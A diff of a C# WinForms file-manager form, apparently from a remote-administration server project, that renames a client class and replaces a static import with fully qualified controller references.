@@ -6,18 +6,17 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Windows.Forms;
-using static Serveur.Controllers.FrmFileManagerController;
 
 namespace Serveur.Views
 {
     public partial class FrmFileManager : Form
     {
-        private readonly ClientMosaic _client;
+        private readonly ClientMosaique _client;
         private const int TRANSFER_STATUS = 2;
         private const int TRANSFER_TYPE = 1;
         private const int TRANSFER_ID = 0;
 
-        public FrmFileManager(ClientMosaic client)
+        public FrmFileManager(ClientMosaique client)
         {
             _client = client;
             _client.value.frmFm = this;
@@ -47,10 +46,10 @@ namespace Serveur.Views
                     {
                         if (_client != null)
                             new DoDownloadFileCancel(id).Execute(_client);
-                        if (!canceledDownloads.ContainsKey(id))
-                            canceledDownloads.Add(id, "canceled");
-                        if (renamedFiles.ContainsKey(id))
-                            renamedFiles.Remove(id);
+                        if (!Serveur.Controllers.FrmFileManagerController.canceledDownloads.ContainsKey(id))
+                            Serveur.Controllers.FrmFileManagerController.canceledDownloads.Add(id, "canceled");
+                        if (Serveur.Controllers.FrmFileManagerController.renamedFiles.ContainsKey(id))
+                            Serveur.Controllers.FrmFileManagerController.renamedFiles.Remove(id);
                         updateTransferStatus(transfer.Index, "Canceled", 0);
                     }
                     else if (transfer.SubItems[TRANSFER_TYPE].Text == "Upload")
@@ -79,10 +78,10 @@ namespace Serveur.Views
                 {
                     if (_client != null)
                         new DoDownloadFileCancel(id).Execute(_client);
-                    if (!canceledDownloads.ContainsKey(id))
-                        canceledDownloads.Add(id, "canceled");
-                    if (renamedFiles.ContainsKey(id))
-                        renamedFiles.Remove(id);
+                    if (!Serveur.Controllers.FrmFileManagerController.canceledDownloads.ContainsKey(id))
+                        Serveur.Controllers.FrmFileManagerController.canceledDownloads.Add(id, "canceled");
+                    if (Serveur.Controllers.FrmFileManagerController.renamedFiles.ContainsKey(id))
+                        Serveur.Controllers.FrmFileManagerController.renamedFiles.Remove(id);
                     updateTransferStatus(transfer.Index, "Canceled", 0);
                 }
                 else if (transfer.SubItems[TRANSFER_TYPE].Text == "Upload")
@@ -98,17 +97,17 @@ namespace Serveur.Views
         {
             if (_client != null && _client.value != null && lvDirectory.SelectedItems.Count > 0)
             {
-                PathType type = (PathType)lvDirectory.SelectedItems[0].Tag;
+                Serveur.Controllers.FrmFileManagerController.PathType type = (Serveur.Controllers.FrmFileManagerController.PathType)lvDirectory.SelectedItems[0].Tag;
 
                 switch (type)
                 {
-                    case PathType.Back:
-                        navigateUp(_client);
-                        refreshDirectory(_client);
+                    case Serveur.Controllers.FrmFileManagerController.PathType.Back:
+                        Serveur.Controllers.FrmFileManagerController.navigateUp(_client);
+                        Serveur.Controllers.FrmFileManagerController.refreshDirectory(_client);
                         break;
-                    case PathType.Directory:
-                        setCurrentDir(getAbsolutePath(lvDirectory.SelectedItems[0].SubItems[0].Text));
-                        refreshDirectory(_client);
+                    case Serveur.Controllers.FrmFileManagerController.PathType.Directory:
+                        setCurrentDir(Serveur.Controllers.FrmFileManagerController.getAbsolutePath(lvDirectory.SelectedItems[0].SubItems[0].Text));
+                        Serveur.Controllers.FrmFileManagerController.refreshDirectory(_client);
                         break;
                 }
             }
@@ -118,13 +117,13 @@ namespace Serveur.Views
         {
             foreach (ListViewItem files in lvDirectory.SelectedItems)
             {
-                PathType type = (PathType)files.Tag;
+                Serveur.Controllers.FrmFileManagerController.PathType type = (Serveur.Controllers.FrmFileManagerController.PathType)files.Tag;
 
-                if (type == PathType.File)
+                if (type == Serveur.Controllers.FrmFileManagerController.PathType.File)
                 {
-                    string path = getAbsolutePath(files.SubItems[0].Text);
+                    string path = Serveur.Controllers.FrmFileManagerController.getAbsolutePath(files.SubItems[0].Text);
 
-                    int uniqId = getNewTransferId(files.Index);
+                    int uniqId = Serveur.Controllers.FrmFileManagerController.getNewTransferId(files.Index);
 
                     if (_client != null)
                     {
@@ -142,7 +141,7 @@ namespace Serveur.Views
             if (_client != null && _client.value != null)
             {
                 setCurrentDir(cboDrives.SelectedValue.ToString());
-                refreshDirectory(_client);
+                Serveur.Controllers.FrmFileManagerController.refreshDirectory(_client);
             }
         }
 
@@ -170,7 +169,7 @@ namespace Serveur.Views
             {
                 if (_client.value != null && setLastDirectorySeen)
                 {
-                    setCurrentDir(Path.GetFullPath(Path.Combine(_currentDir, @"..\")));
+                    setCurrentDir(Path.GetFullPath(Path.Combine(Serveur.Controllers.FrmFileManagerController._currentDir, @"..\")));
                     _client.value.receivedLastDirectory = true;
                 }
                 statusStrip.Invoke((MethodInvoker)delegate
@@ -185,12 +184,12 @@ namespace Serveur.Views
 
         public void setCurrentDir(string path)
         {
-            _currentDir = path;
+            Serveur.Controllers.FrmFileManagerController._currentDir = path;
             try
             {
                 txtPath.Invoke((MethodInvoker)delegate
                 {
-                    txtPath.Text = _currentDir;
+                    txtPath.Text = Serveur.Controllers.FrmFileManagerController._currentDir;
                 });
             }
             catch (InvalidOperationException)
@@ -212,11 +211,11 @@ namespace Serveur.Views
             }
         }
 
-        public void addItemToFileBrowser(string name, string size, PathType type, int imageIndex)
+        public void addItemToFileBrowser(string name, string size, Serveur.Controllers.FrmFileManagerController.PathType type, int imageIndex)
         {
             try
             {
-                ListViewItem lvi = new ListViewItem(new string[] { name, size, (type != PathType.Back) ? type.ToString() : string.Empty })
+                ListViewItem lvi = new ListViewItem(new string[] { name, size, (type != Serveur.Controllers.FrmFileManagerController.PathType.Back) ? type.ToString() : string.Empty })
                 {
                     Tag = type,
                     ImageIndex = imageIndex
